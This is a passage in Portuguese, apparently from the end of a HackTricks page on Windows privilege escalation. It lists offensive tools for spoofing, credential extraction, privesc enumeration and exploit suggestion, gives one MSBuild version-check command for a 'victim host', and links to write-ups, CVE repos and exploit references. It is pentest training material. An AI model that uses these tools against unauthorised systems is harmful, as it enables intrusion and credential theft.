[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh é uma ferramenta PowerShell de spoofing de ADIDNS/LLMNR/mDNS e man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeração básica de Windows para privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Procura vulnerabilidades conhecidas de privesc (DEPRECATED para Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Verificações locais **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Procura vulnerabilidades conhecidas de privesc (precisa ser compilado usando VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera o host procurando misconfigurations (é mais uma ferramenta de coleta de informações do que de privesc) (precisa ser compilado) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrai credentials de vários softwares (exe precompiled no github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port do PowerUp para C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Verifica misconfiguration (executável precompiled no github). Não recomendado. Não funciona bem no Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Verifica possíveis misconfigurations (exe de python). Não recomendado. Não funciona bem no Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Ferramenta criada com base neste post (não precisa de accesschk para funcionar corretamente, mas pode usá-lo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lê a saída de **systeminfo** e recomenda exploits funcionais (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lê a saída de **systeminfo** e recomenda exploits funcionais (python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Você precisa compilar o projeto usando a versão correta do .NET ([veja isto](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Para ver a versão instalada do .NET no host vítima, você pode executar:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referências

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: phishing com macro VBA do Word via SMTP → descriptografia de credenciais do hMailServer → Veeam CVE-2023-27532 para SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: leak de format-string + BOF na stack → VirtualAlloc ROP (RCE) e roubo de token do kernel](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Perseguindo a Silver Fox: gato e rato nas sombras do kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Vulnerabilidade de sistema de arquivos privilegiado presente em um sistema SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Ferramentas de teste de Symbolic Link – uso do CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [Um Link para o Passado. Abusando de Symbolic Links no Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (port do Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: resolução perigosa de módulos no Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Módulos do Node.js: carregamento a partir de pastas `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - desafios do checklist de C/C++, resolvidos](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - função RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
